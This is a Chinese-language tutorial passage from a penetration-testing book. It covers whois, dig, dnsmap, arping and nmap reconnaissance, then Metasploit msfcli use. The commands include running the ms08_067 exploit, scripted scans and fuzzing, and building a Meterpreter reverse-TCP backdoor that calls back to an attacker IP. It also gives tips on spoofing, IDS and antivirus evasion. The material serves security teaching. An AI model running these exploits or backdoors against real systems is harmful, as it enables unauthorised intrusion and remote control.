现在你已经掌握了 bash shell 的工作方式，并学会了一些技巧和窍门来有效地使用它，我们可以继续使用 shell 和 Kali Linux 命令行实用程序来收集关于你日常工作中所在网络的信息。

在本章中，我们将看到如何使用诸如 Nmap、Whois、Dig 和其他各种网络信息抓取工具来了解本地网络或外部网络上主机的安全状况。

在下一节中，我们将介绍一个名为`whois`的工具，它可以方便地查询 Whois 服务器，获取有关组织以及它们负责的 IP 地址和域名的信息。

# 询问 Whois 服务器

Whois 服务器保存了关于某些组织负责或严格相关的 IP 地址、域名和其他网络寻址相关信息。当你请求 Whois 记录的信息时，你所做的只是使用一个称为 Whois 的特殊应用协议查询托管在 Whois 服务器上的数据库。协议的细节在*进一步阅读*部分有引用。

在渗透测试期间，你可能会收到一个要处理的 IP 地址列表，或者一个解析为 IP 地址的域名。通常，你可能想知道这个 IP 属于谁，以及同一逻辑网络块上可能托管了什么其他内容；Whois 是一个很好的工具，可以找出这类信息。

从命令行询问 Whois 服务器是通过使用一个名为`whois`的工具来完成的，它随许多 Linux/Unix 发行版一起提供，包括 Kali。

当你使用`whois`工具时，你可以指定许多选项。在这里，我们只会涵盖一些非常有用的选项。对于那些想要了解更多关于`whois`工具的人，请参阅本章*进一步阅读*部分中包含的信息。

Whois 的基本功能是返回与 IP 地址相关的一组属性：这些属性的集合称为**whois**记录。查找使用 IP 地址的记录就像简单地执行以下命令一样：

```
whois [IP address]

```

例如，这是你如何检索 Google 服务器地址的 Whois 记录：

```
whois 74.125.233.83

```

上一个命令将产生以下输出：

![询问 Whois 服务器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_01.jpg)

当你运行 Whois 查询或查找时，你面前的是一个对象，每个对象都有一堆与之相关的属性，以键值对的形式。每个对象都包含有关负责记录/对象本身的人的信息：这个人被称为维护者。维护者决定在描述相关对象时使用哪些属性。有许多可能的属性，对于那些有兴趣了解完整故事的人，这些属性在*进一步阅读*部分有引用。

除了仅仅查询与 IP 地址相关的 Whois 服务器的信息，你可能还想查找与给定组织相关的某些信息，或者你可能想查找数据库中提到给定值的所有信息，例如，维护者或给定的电子邮件地址。这被称为反向查找属性查找。以下命令用于执行此操作：

```
whois –i [attribute name] [value]

```

例如，考虑查找由 Yahoo!的人员维护的所有 whois 记录。以下命令显示了如何做到这一点：

```
whois –i mnt-by  YAHOO-MNT 

```

### 提示

你可能想要查找一些你喜欢的 IP 地址范围的维护者名称，并在这个例子中使用它们。由于默认情况下`Whois`工具可能依赖于特定于你国家的 Whois 服务器，所以你可能不会得到与以下演示完全相同的结果。

您可能希望从此查询中过滤出 IP 地址。最简单的方法是使用`grep`，如下命令所示：

```
whois –i mnt-by  YAHOO-MNT  | grep inetnum

```

您可能还想仅过滤出 IP 地址以供其他工具使用，例如`Nmap`和`Dig`，我们将在本章的后续部分进行介绍。以下是一个能够执行此操作的小 bash 命令：

```
whois –i mnt-by YAHOO-MNT | grep inetnum | awk –F\: '{ print $2 }'

```

前面的命令应该产生以下输出：

![审问 Whois 服务器](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_04.jpg)

您可以使用以下其他属性来执行反向查询：

+   `-i admin-c [NIC 句柄或人]`

+   `-i person [NIC 句柄或人]`

+   `-i nsserver [域或地址前缀或范围或单个地址]`

+   `-i sub-dom [域]`

+   `-i upd-to [email]`

+   `-i local-as [自治系统号]`

您可以使用其中的一些：请参阅*进一步阅读*部分获取完整列表。

您还可以使用`whois`工具查找与给定域名相关的域名，使用以下命令：

```
whois [domain name]

```

例如，您可以按以下方式使用它：

```
whois google.com

```

或者，您可以使用以下命令：

```
whois –d google.com

```

通过在查找中添加一些`grep`和`awk`魔法，您可以过滤出诸如域名之类的有用信息，如下面的代码所示：

```
whois google.com | grep Server\ Name | awk –F\: '{ print $2 }'
whois –d google.com | grep Server\ Name | awk –F\: '{ print $2 }'

```

我们已经基本介绍了渗透测试人员和安全工程师可能会发现有用的`whois`服务的功能。在下一节中，我们将介绍使用 Dig 执行 DNS 审问。

# 审问 DNS 服务器

DNS 服务器存在是为了提供计算机使用的 IP 地址与人们使用的域名之间的关联。通常，公司和组织使用多个子域，甚至可能为给定的 IP 地址使用多个域名。这自然意味着 DNS 服务器对于渗透测试人员来说是一个丰富的信息来源，可以帮助他们定义组织的公共足迹并绘制攻击面。

## 使用 Dig

我们将在这里使用的第一个命令行工具称为**Dig**。 Dig 本质上是一个 DNS 查找瑞士军刀，可以方便地了解有关给定域或与 IP 地址相关的域的几乎所有信息。使用 Dig，您将模拟-实际执行-浏览器和其他网络应用程序与世界各地的 DNS 服务器交互时使用的查询。有些查询甚至模拟其他 DNS 服务器的行为。让我们看看`dig`是如何工作的，以及在渗透测试期间如何充分利用它。

使用`dig`的最简单方法是提供要查找的域名。以下命令向您展示了如何执行此操作：

```
dig [domain name]

```

例如，您可以尝试使用以下方式的域名`google.com`：

```
dig google.com

```

前面的命令将产生以下输出：

![使用 Dig](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_05.jpg)

前面截图中突出显示的输出显示了实际返回的结果，即 Google 的 IP 地址。

您还可以通过使用`type`选项让`dig`知道您要查找的记录类型，如下所示：

```
dig [domain name] [type]

```

例如，如果您要查找`google.com`的邮件交换记录（MX 记录），您可以向`dig`提供以下选项：

```
dig google.com MX

```

否则，您可以使用`-t`选项，如下所示：

```
dig google.com –t MX

```

如果命令执行正确，您的输出应该类似于以下截图：

![使用 Dig](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_06.jpg)

以下是您可以使用`dig`查找的记录类型：

+   `A`：这是地址记录，保存了与查询域关联的 IP。

+   `AAAA`：这是 IP 版本 6 地址记录。

+   `CNAME`：这是规范名称记录，它将返回指定域的域名，该域是规范记录。这就像询问`dig`所提供的域是否是另一个域的昵称，或者更准确地说，给定的域名是否使用另一个域的 IP 地址，`dig`会返回这些域。

+   MX：这是邮件交换记录，列出了与提供的域关联的地址作为消息传输代理。您可以使用此选项查找给定域的邮件域。

+   PTR：这是指针记录，通常用于反向 DNS 查找。

+   SOA：这是权威/区域记录的开始，它将返回与提供的域的主域服务器“授权”相关的记录。

+   AXFR：这是权威区域传输，它要求给定的名称服务器返回与给定域相关的所有记录。现代 DNS 服务器不应远程启用此选项，因为它会泄露大量关于披露漏洞的信息，主要是内部地址披露，并且会使拒绝服务攻击非常有效。

还有一些其他有趣的记录类型。我在这里列出了最常用的记录类型。对于那些想要了解其他记录类型的人，请在本章末尾的*进一步阅读*部分查看 RFC。

以下命令是这些记录类型的一些示例的实际操作：

```
dig google.com AAAA

```

上一个命令应返回以下截图中显示的结果：

![使用 Dig](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_07.jpg)

否则，您可以查找`mail.google.com`是规范名称的域。使用以下代码完成：

```
dig mail.google.com CNAME

```

上一个命令应产生以下输出：

![使用 Dig](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_08.jpg)

通常，您可能希望跳过 DNS 查询返回的所有细节，并且只返回您请求的重要数据，即地址。`+short`选项允许您执行此操作。如下所示使用：

```
dig twitter.com +short 

```

此选项允许`dig`在使用管道和 bash for 循环或其他脚本时更易于管理，因为它减少了必须过滤所有其他输出的麻烦。例如，您可以如下使用`dig`与`whois`：

```
for ip in `dig www.google.com +short`; do whois $ip; done

```

Dig 还允许使用`-x`选项进行反向 IP 解析。例如，如果您想找出与给定 IP 关联的域名，您可以使用以下命令：

```
dig –x [IP address]

```

通常，您可能会有一个长列表的 IP 地址或通过其他方式枚举的列表，例如使用`whois`，您可能想找出其中哪些映射到 IP 地址。现在，您可以手动为每个 IP 发出`dig`查询。但是，使用一点 bash 脚本和 dig，您可以非常轻松地自动化整个过程。假设您的 IP 在一个文件中，每个 IP 占据一行。您可以发出以下命令来反向查找它们：

```
for IP in `cat [ip list]`; do echo "[*] $IP -> "`dig –x $IP +short`; done

```

在上一个命令中，`[ip list]`将是包含所述 IP 地址的文件。

这就是`dig`工具和 DNS 协议的基本介绍。我建议您阅读有关 DNS 工作原理的更多信息。接下来的几节将讨论允许您使用暴力破解和其他开源情报收集从 DNS 服务器中恢复记录的工具。通常，渗透测试人员使用这两个工具作为最后的手段，因为它们会暴力破解记录，并且是`dig`的相当激进的替代方案。

## 使用 dnsmap

有时，您可能需要暴力破解域名或子域名，因为这些可能非常难以枚举，对于给定的主机或网络，如果其他选项如`dig`和`whois`没有提供足够的信息供您使用。在这种情况下，诸如`dnsmap`和`dnsenum`之类的工具非常有用。

使用`dnsmap`非常简单。如果您一直在关注我们介绍的其他命令，那么这应该很容易。

以下是`dnsmap`的用法规范：

```
dnsmap [domain] [options]
[domain] := domain name to look up
[options] := [ -w WORDLIST | -r RESULTS-FILE | -c CSV-RESULTS-FILE | -i IP-IGNORE-LIST ]

```

在我们了解这些选项的含义之前，让我们看看`dnsmap`在其最基本的调用中是如何工作的，即没有选项：

```
dnsmap [domain]

```

例如，考虑对`google.com`域进行以下查找：

![使用 dnsmap](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_10.jpg)

如果没有参数调用`dnsmap`，它将使用自己内置的单词列表来枚举域。此单词列表可以在`/usr/share/wordlist_TLAs.txt`路径下找到。

以下是`dnsmap`的选项：

+   `-w WORDLIST`：此选项接受一个单词列表作为参数。`dnsmap`将使用此单词列表来枚举可能的子域。

+   `-r RESULTS-FILE`：此选项告诉`dnsmap`在哪里保存其操作的结果。可能会有数百个枚举的 IP 地址和子域，将它们保存在某个地方以供以后处理总是很好的。

+   `-c CSV-RESULTS-FILE`：这与前面的选项相同，只是结果保存在**逗号分隔向量**（**CSV**）文件中，这是数据库的常用格式。

+   `-i IP-IGNORE-LIST`：此选项接受要在查找过程中忽略的 IP 列表，以防它们混淆或向输出引入错误的阳性。

这就是关于`dnsmap`的全部内容：不是一个非常复杂的工具，但它总是能完成任务！

# 在本地网络上枚举目标

在这里，将使用一个名为**网络映射器**（**Nmap**）和另一个名为**Arping**的工具来枚举本地网络上的目标。Nmap 本身是网络评估的事实标准，几乎可以执行 Hping、Fping 和 Arping 的任何操作。在许多情况下，特别是在防火墙评估中，渗透测试人员需要能够微调发送的数据包并对准确收集的数据进行分析。诸如 Hping、Fping 和 Arping 之类的工具非常适合这样做，因为它们允许渗透测试人员为几乎任何所需的网络协议构造任意数据包。

在下一节中，我们将介绍 Arping 工具，并演示如何使用它执行基于 ARP 协议的发现。

## 使用 Arping 进行主机发现

Arping 是一个实用程序，允许您创建 ARP 或 ICMP 数据包并将其发送到本地网络上的任意主机。当然，这是一个枚举活动主机的好方法。它还是一个非常信息驱动的工具，实际上将 ICMP 和 ARP 回复直接打印到屏幕上。

以下示例将演示 Arping 命令的一些简单用法。首先，在我们介绍一些选项和地址模式之前，让我们看看如何进行简单的 ARP ping：

```
arping [IP Address]
arping 192.168.10.1

```

您的输出应该如下所示，除了返回 MAC 地址和可能使用 IP 地址之外：

![使用 Arping 进行主机发现](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_12.jpg)

如果从主机收到回复，这强烈表明所提到的主机实际上存在于网络中。当然，由于 ARP 协议的加密强度不足，这些信息是否严格属实并不保证。您应该记住这一点，关于通过不安全协议传输的所有信息。

您可能希望遍历给定子网上的 IP 列表。使用一些 bash 脚本，您可以按以下方式执行。以下代码将在本书的网站上提供：

```
#!/bin/bash
PREFIX=$1
INTERFACE=$2
for SUBNET in {1..255}
do
  for HOST in {1..255}
  do
    echo "[*] IP : "$PREFIX"."$SUBNET"."$HOST
    arping –c 3 –i $INTERFACE $PREFIX"."$SUBNET"."$HOST 2> /dev/null
  done
done
```

在上一个脚本中，我们使用了`-c`命令来确保只发送三个请求。我们还允许用户指定正在使用的接口，因为通常 Arping 并不真正很好地自主查找接口。此外，必须在此处输入本地 IP 地址的前缀。因此，如果您想使用此脚本，请将其保存在文件中（在本例中，我们将其称为`arpsweep.sh`），并在使用默认以太网接口时调用它如下：

```
. arpsweep 192.168 eht0 

```

否则，如果您使用默认的无线局域网接口，则使用以下命令：

```
. arpsweep 192.168 wlan0

```

Arping 的其他选项如下：

+   `-c COUNT`：这意味着只发送`COUNT`数量的请求。

+   `-d`：查找重复的回复。此选项作为监视工具非常好。它将能够检测到您网络中是否有人伪造了另一个主机的 MAC 地址；攻击者经常这样做以发起中间人攻击。

+   `-i`：这是接口。不要尝试自动找到接口；使用提供的接口。

+   `-p`：为指定的接口打开混杂模式，并允许您指定其他 MAC 地址作为源地址，即 MAC 欺骗。

+   `-r`：显示原始输出，表示每个回复只显示 MAC 和 IP 地址。

至于寻址模式，选项如下：

+   `-s MAC`：这意味着使用`MAC`作为源 MAC 地址。如果您正在枚举的网络或主机选择使用源 MAC 过滤，只向少数主机提供响应，这个选项非常有效。

### 提示

在发送任何数据包之前，尝试运行数据包捕获工具（本书后面会介绍），并尝试了解哪些通信模式是常规的。哪个主机正在使用哪种协议与哪个主机通信，以及频率如何。这可能使您尽可能地利用网络的自然节奏，并可能完全不被 Snort 和其他 IDS/IPS 工具等工具察觉。

+   `-S IP`：此选项指示使用 IP 作为源 IP 地址，即 IP 欺骗。如果基于主机的防火墙只允许有限数量的 IP 地址与其通信，此选项非常适合欺骗其中一个允许的 IP 地址。

+   `-t MAC`：此选项指示使用`MAC`作为目标 MAC 地址。

+   `-T IP`：此选项指示使用`IP`作为目标 IP 地址。

就 ARPing 而言，就是这样了。我建议您尝试`arping`。在微调 ICMP 和 ARP 流量方面，很少有工具能像 ARPing 一样有效。如果您需要了解 ARP 协议的一些背景知识，我在*进一步阅读*部分中包含了一些有趣的链接供您查阅。

## 使用 Nmap 进行目标枚举

ICMP 经常被攻击者在本地网络上滥用，因为它的性质决定了它不是为了提供安全性或考虑任何当前的安全机制而设计的。这经常导致攻击者滥用 ICMP 来获取敏感信息或可以用来确定或推断网络上主机的敏感细节的信息。

首先，让我们使用 ICMP 协议探测主机的响应。Nmap 对 ICMP 探测的使用规范如下命令：

```
nmap –sn {OPTOINS}[host address | domain name | CDIR netmask | IP range]

```

以下是一些示例：

```
nmap –sn –v –-reason 192.168.10.0/24
nmap –sn –v –-reason 192.168.10.0-255

```

`–sn`开关告诉 Nmap 使用 ICMP 协议来确定所述范围内的主机是否可达，并且禁用端口扫描。`-v`表示详细模式，`–-reason`告诉 Nmap 实际打印关于它确定主机的某些结果的信息。上一个命令的输出如下截图所示：

![使用 Nmap 进行目标枚举](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_03_14.jpg)

ICMP 协议是一种用于从网络主机请求调试或故障排除信息的网络协议。

其他主机发现选项包括以下内容：

+   `-PE`：告诉 Nmap 使用 ICMP 回显请求，这是在 ping 主机时发送的数据包。

+   `-PP`：告诉 Nmap 使用时间戳请求。响应时间戳请求的主机通常在渗透测试中报告为发现。通常，默认和配置薄弱的加密库使用系统时间来生成加密原语。`-PM`使用 ICMP 网络掩码请求；这些 ICMP 数据包最初是为了让网络工程师查询主机的网络配置信息而实现的。以下命令是一个示例：

```
nmap –v –reason –PM 192.168.10.0/24

```

如果您需要使用其他协议来识别您的目标，Nmap 提供了广泛的功能。以下是其中一些选项：

+   `-PS TCP SYN` **标志扫描**：此选项向主机发送 SYN 数据包，并通过解释响应或缺少响应来确定它们是否实际上在网络上。

+   `-PA TCP ACK` **标志扫描**：此选项告诉 Nmap 向目标发送 TCP ACK 标志，以确定其是否存活并响应数据包。网络上的机器通常会严格遵守 TCP 协议标准，并通过发送带有 REST 数据包的 ACK 标志来响应数据包。

+   `-PO IP` **协议 ping**：此选项通过监听带有 REST 标志的 TCP 数据包来枚举目标主机支持的协议，因为活动主机通常会以这种方式响应对协议号设置任意标识符的无效数据包。

有关 Nmap 中有关主机发现的更多选项，请参阅*进一步阅读*部分中包含的链接。

# 总结

在本章中，我们重点介绍了渗透测试人员在安全评估期间用来获取有关其目标网络的信息的基本方法和工具。

本章首先演示了 Whois 工具，并介绍了可以用来自动化 Whois 工具以及进行非常有益的查找和将 Whois 的输出与其他有用工具集成的技巧和窍门。然后我们转向 DNS 协议，并介绍了 Kali Linux 命令行中可用的工具，可以用来从 DNS 服务器获取关于特定目标的信息。我们特别讨论了`dig`和`dnsmap`。之后，我们介绍了如何利用网络中常用的轻量级寻址协议来枚举本地网络上的目标。目标枚举部分重点演示了如何使用 Arping 和 Nmap 来枚举本地目标。

# 进一步阅读

+   RIPE Whois 数据库查询参考手册在[`www.ripe.net/ripe/docs/ripe-358`](http://www.ripe.net/ripe/docs/ripe-358)

+   dig (1) Linux man 页面在[`linux.die.net/man/1/dig`](http://linux.die.net/man/1/dig)

+   在域名系统（DNS）中存储证书在[`tools.ietf.org/html/rfc4398`](http://tools.ietf.org/html/rfc4398)

+   域名 - 实施和规范在[`www.ietf.org/rfc/rfc1035.txt`](http://www.ietf.org/rfc/rfc1035.txt)

+   Nmap 在线书籍在[`nmap.org/book/toc.html`](http://nmap.org/book/toc.html)


# 第四章：利用和逆向工程

在上一章中，我们介绍了一些处理网络上目标枚举的命令行工具。在本章中，我们将看一些工具的集合，使您能够执行诸如逆向工程和后门主机等活动，并且我们还将介绍集成强大工具的方法，例如 Metasploit 利用框架和 bash 脚本。

此外，在本章中，我们将涵盖一系列工具，这些工具可能使您能够发现内存损坏、代码注入和一般数据或文件处理缺陷，这些缺陷可能用于实例化任意代码执行漏洞。

在某个时间点发现的每个漏洞都涉及逆向工程。当有人找出如何利用给定行为时——在一段代码中——这意味着这个人在某种程度上详细说明了给定行为的细微差别，并利用这些知识来利用它。这个过程称为逆向工程。由于逆向工程具有如此重要的意义，我们将涵盖一些在逆向工程中发挥作用的基本工具。我们将特别关注 Kali Linux 中打包的纯命令行驱动的工具——因此是本书的标题。

# 使用 Metasploit 命令行界面

Metasploit 可能是最广泛使用的渗透测试和利用开发框架，人们用来测试、发现和开发漏洞利用的最常用工具。多年来，Metasploit 被视为安全行业最有才华的开发人员和利用编写者的支持。

Metasploit 框架的许多有用功能之一是其能够将其模块和工具的调用暴露给命令行。这意味着 Metasploit 可以在功能丰富和强大的问题解决环境中使用 bash shell。这个功能称为**Metasploit 命令行界面**（**msfcli**）。

## 使用 msfcli 入门

在本节中，我们将看到如何使用 Metasploit 命令行界面进行基本扫描，利用一些通用漏洞，并将一些有用的 bash 脚本与 Metasploit 命令行界面集成。

以下是`msfcli`命令的用法规范：

```
msfcli [MODULE] [OPTIONS] [MODE]
[MODULE] := [exploit/* | auxiliary/* | payload/* | post/* ]
[OPTION] := [ [option_name] = [value] <space> ]*
[MODE] := [A | AC | C | E | H | I | O | P | S | T ]

```

从前一个命令中，`MODULE`，`OPTIONS`和`MODE`解释如下：

+   `[MODULE]`：这是要调用的 Metasploit 模块。这可以是您可以从 Metasploit 控制台调用的任何模块。

+   `[OPTIONS]`：这是给定模块的空格分隔的键值对选项列表。这些选项特定于此处调用的模块。在接下来的段落中，我们将看到如何确定给定模块的选项。

+   `[MODE]`：这是模块的调用模式。

考虑以下示例：

```
msfcli exploit/windows/smb/ms08_067_netapi RHOST=192.168.10.108 E

```

在前面的示例中，`MODULE`选项将是`exploit/windows/smb/ms08_067_netapi`，`OPTIONS`列表是`RHOST=192.168.10.108`。

您可以按以下方式为模块指定更多选项列表：

```
msfcli exploit/windows/smb/ms08_067_netapi RHOST=192.168.10.108 RPORT=445 SMBPIPE=BROWSER

```

这里并不重要这个利用在这里做什么；我们只是演示了 msfcli 的基本用法。稍后，我们将演示如何使用 msfcli 来了解更多关于利用模块的方法。

## 使用 msfcli 的调用模式

根据您指定的调用模式，可以以不同的方式调用 Metasploit 命令行界面。调用模式的效果各不相同，即从提供有关模块的信息，例如有关谁开发了它的信息，到提供有关如何启用 IDS 规避技术以及可以用于触发或打包相关漏洞的有效负载的信息（如果适用）。

首先，让我们看一下旨在提供有关模块信息的调用模式。您可能不总是知道要调用的模块有哪些选项。在这种情况下，Metasploit 有一个非常有用的模式，您可以使用 msfcli 模块调用。以下命令用于执行此操作：

```
msfcli exploit/windows/smb/ms08_067_netapi O

```

前面的命令将产生以下输出：

![使用 msfcli 的调用模式](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_01.jpg)

选项调用模式——作为命令行参数缩写为`O`——显示了仅必要选项的简要摘要，即成功运行指定模块所需的严格必要的选项。您可能还想了解一些关于模块背景的信息，例如由谁开发，它试图利用哪些漏洞，以及它设计用于目标的操作系统。您可以使用摘要调用模式来找到这些信息，它的缩写是`S`。以下命令用于执行此操作：

```
msfcli exploit/windows/smb/ms08_067_netapi S

```

+   前面的命令将产生以下输出：

![使用 msfcli 的调用模式](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_02.jpg)

在前面的截图中演示的模式只打印基本必要选项的摘要。您还可以让 Metasploit 使用以下命令打印出使用高级模式的完整选项列表：

```
msfcli exploit/linux/imap/imap_uw_lsub A

```

前面的命令产生以下输出：

![使用 msfcli 的调用模式](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_03.jpg)

出于简洁起见，前面截图中的一些输出已被省略。以下可能是其他调用选项：

+   `AC`：详细说明了给定模块的可用选项

+   `C`：检查所提供模块的例行程序

+   `I`：显示此模块可用的 IDS 规避技术

+   `P`：列出模块的可用有效载荷类型

+   `T`：列出此模块的可用操作系统目标

这结束了我们关于 Metasploit Framework 命令行界面的讨论。下一部分将介绍如何在渗透测试或漏洞评估的常见情况下，将这种功能与 bash 脚本和其他命令行实用程序集成起来。

## Bash hacks 和 msfcli

考虑到 msfcli 允许我们直接从命令行调用 Metasploit 模块，我们可以做一些非常有用的事情，比如将 Nmap 扫描的结果与 msfcli 集成，或者直接将 DNS 或 Whois 查找的结果插入到 msfcli 模块调用中。接下来的部分将演示一些非常有用的 bash 脚本，就是做这些事情。

如果您想要检查从 Whois 查找中传播的一系列 IP 的漏洞利用性，您可以直接从命令行界面执行以下 bash 脚本：

```
msfcli [MODULE] RHOSTS=`whois $(dig [domain name] +short ) |\ 
awk –F\  '/inetnum/ { print $2"-"$4 }'` C

```

在前面的命令中，`[MODULE]`和`[DOMAIN NAME]`将分别是您想要使用的 Metasploit 模块的名称和路径（就像在 Metasploit 控制台中使用的那样），以及您想要针对其运行模块的域名。

### 提示

**关于长命令行**

前面的示例必须完整输入，一次输入到您的 bash shell 中的一行命令。这意味着在输入完整行之前不要按*Enter*。`\`转义字符允许您在终端中输入多行并将其视为单个命令行调用。这避免了输出在屏幕上换行，这在某些情况下会变得有点难以阅读。

您选择的模块需要支持检查调用模式的多个主机。一个简单的实际示例是使用给定的域名与 Metasploit 模块之一进行端口扫描。以下命令显示了如何执行此操作：

```
msfcli auxiliary/scanner/portscan/syn RHOSTS=`whois $(dig [domain name] +short ) | awk –F\  '/inetnum/ { print $2"-"$4 }'` E

```

当然，如果您正在评估的组织根据 Whois 数据库负责一些 IP 范围，您可以首先枚举所有 IP 范围，并使用以下命令将它们提供给 msfcli：

```
for range in `whois –i mnt-by [maintainer]|awk –F '/inetnum/ { print $2"-"$4 }'
 do
 msfcli auxiliary/scanner/portscan/syn RHOSTS=$range E
 done

```

如果您想在单个命令行中指定先前的命令，它将如下所示的代码：

```
for range in `whois –i mnt-by [maintainer] | awk –F '/inetnum/ { print $2"-"$4 }'; do msfcli auxiliary/scanner/portscan/syn RHOSTS=$range E; done

```

您可以将 msfcli 与 bash 结合使用的另一种有用的方法是从 Nmap 扫描中拔出，并根据发现的开放端口开始使用一些 Metasploit 模糊测试模块对它们进行模糊测试。以下命令向您展示了如何执行此操作：

```
for ip in `nmap –v –T5 –p[PORT] [HOST] | awk –F\  '/[PORT]\/[tcp | udp] on/ { print $6 }'`
 do
 msfcli [MODULE] RHOST=$ip E;
 done

```

如果在单个命令行中指定，它将如下所示：

```
for ip in `nmap –v –T5 –p[PORT] [HOST] | awk –F\  '/[PORT]\/[tcp|udp]on/ { print $6 }'`; do msfcli [MODULE] RHOST=$ip E; done

```

例如，您可以使用以下代码对页面上的 HTTP 表单进行模糊测试：

```
for ip in `nmap –v –T5 –p80 [HOST] | awk –F\  '/80\/tcp on/ { print $6 }'`; do msfcli auxiliary/fuzzers/http/http RHOST=$ip E; done

```

另一个例子是使用以下代码对 SSHv2 服务器进行模糊测试：

```
for ip in `nmap –v –T5 –p22 [HOST] | awk –F\  '/22\/tcp on/ { print $6 }'`; do msfcli auxiliary/fuzzers/ssh/ssh_version_2 RHOST=$ip E; done

```

这里可以展示许多其他例子。实际上，您可以编写一本完全由涉及 msfcli 和端口扫描工具的例子组成的书。不仅如此，您还可以开发自己的 Metasploit 模糊测试和漏洞扫描模块。

解释这些例子的目的是向您展示一个通用的样式，您可以遵循这个样式，如果您想从 Nmap 或其他枚举工具中抓取 IP 列表并自动将结果提供给 msfcli。在开发这些类型的 bash 脚本时，我们将遵循以下通用模式：

1.  使用`grep`或 awk 来隔离您感兴趣的结果中的数据，以便与您的 Metasploit 模块集成。

1.  迭代通过提取的数据样本列表（如果适用）。

1.  将它们填充到调用给定模块的命令行。

有很多问题，您不仅可以解决，还可以使用这种模式自动化。它还可以帮助您以默认方式组合 Metasploit 模块，除非我们将自己的模块脚本化到功能中。

# 使用 Metasploit 准备有效载荷

在渗透测试期间，您可能经常需要证明您对主机有无限制的控制，或者您可能需要实际使用某种远程访问命令行界面与它们交互。如果您发现自己处于可以在主机上执行任意代码的情况，并且希望远程控制它，那么利用这种情况的最常见方式之一是上传一个允许您远程与命令行或提示交互的 shell。Metasploit 有一个专门用于满足这些情况的工具，称为 msfpayload。

Metasploit 有效载荷生成器（msfpayload）允许您生成一个可执行包，该包连接到在您的 Metasploit 会话中运行的 Meterpreter 实例。

### 提示

**关于 Meterpreter**

Metasploit 的 Meterpreter 是一个接口，允许用户动态地将指令注入到使用适当的 Meterpreter 启用的有效载荷感染的主机中。简单来说，渗透测试人员可以准备调用回到 Meterpreter 实例的有效载荷，这使他们可以使用各种工具与主机交互，例如注入代码以转储密码哈希、提升权限，甚至避免检测。

在本教程中，我们将演示如何准备授予您此功能的利用。

首先，让我们看一下可用的有效载荷。您可以通过执行以下命令来查看这些：

```
msfpayload –l

```

以下截图演示了先前的选项：

![使用 Metasploit 准备有效载荷](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_04.jpg)

每个有效载荷都有许多选项，这是大多数 Metasploit 模块的风格。要查看有效载荷的可用调用选项，您应该执行以下命令：

```
msfpayload [payload] O

```

例如，考虑以下命令：

```
msfpayload cmd/unix/reverse O

```

以下截图演示了先前的命令：

![使用 Metasploit 准备有效载荷](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_05.jpg)

根据您想要使用的代码格式，有许多方法来表示各种有效载荷。以下是可用的选项：

+   `R`：这是用于原始的二进制格式。

+   `C`：这是用于 C 代码

+   `y`：这是用于 Ruby 代码

+   `H`：这是用于 C#代码

+   `P`：这是用于 Perl 代码

+   `J`：这是用于 JavaScript

+   `X`：这是用于可执行格式

+   `D`：这是用于动态链接库（DLL）

+   `V`：这是用于 VBA 代码

+   `W`：这是用于 War 存档

以下屏幕截图演示了其中一些选项的效果：

![使用 Metasploit 准备有效载荷](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_06.jpg)

每个选项都存在以满足不同操作系统和运行时环境的利用。

# 创建和部署有效载荷

例如，我们将为 Ubuntu 32 位机器创建一个后门。执行以下步骤：

1.  以可执行格式创建有效载荷。在这里，我们将使用 Meterpreter shell 并将其保存在名为`backdoor`的文件中。以下命令将实现此目的：

```
msfpayload linux/x86/meterpreter/reverse_tcp LHOST=[Attacker IP] X > backdoor

```

`LHOST`是您作为攻击者使用的机器的 IP 地址，或者更确切地说，您希望与后门进行交互的机器的 IP 地址。

请参阅以下屏幕截图以获取示例：

![创建和部署有效载荷](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_07.jpg)

1.  在目标主机上部署后门。这一步显然取决于您对所述主机的访问权限。对于我们的示例，我们将简单地使用`scp`将其上传到给定用户的主目录。

1.  在攻击者机器上启动 Metasploit 处理程序，使用以下代码：

```
msfcli multi/handler payload=linux/x86/Meterpreter/reverse_tcp LHOST=[attacker IP]

```

例如，使用以下命令启动 Metasploit 处理程序：

```
msfcli multi/handler payload=linux/x86/Meterpreter/reverse_tcp LHOST=192.168.10.103

```

1.  在目标主机上执行有效载荷。对于我们的示例，这将简单地涉及启动有效载荷，如下面的屏幕截图所示：![创建和部署有效载荷](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_08.jpg)

1.  您应该在您的机器上看到以下启动，即与 Meterpreter 处理程序的连接回来：![创建和部署有效载荷](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_04_09.jpg)

前面的屏幕截图显示了对受影响主机的目录访问。

您应该记住，msfpayload 在安全行业中被广泛使用，无论是渗透测试人员还是编写防病毒软件的人。这意味着，如果您尝试在安装了现代防病毒软件的主机上部署一种常见的 Metasploit 有效载荷，它可能不会触发防病毒软件数据库中的签名，除非您使用编码器或多态引擎的服务。这两种机制（编码和多态化）对您的后门中的恶意有效载荷进行编码和混淆，以使防病毒软件无法识别它为恶意。有关更多详细信息，请参阅本章末尾的*进一步阅读*部分。

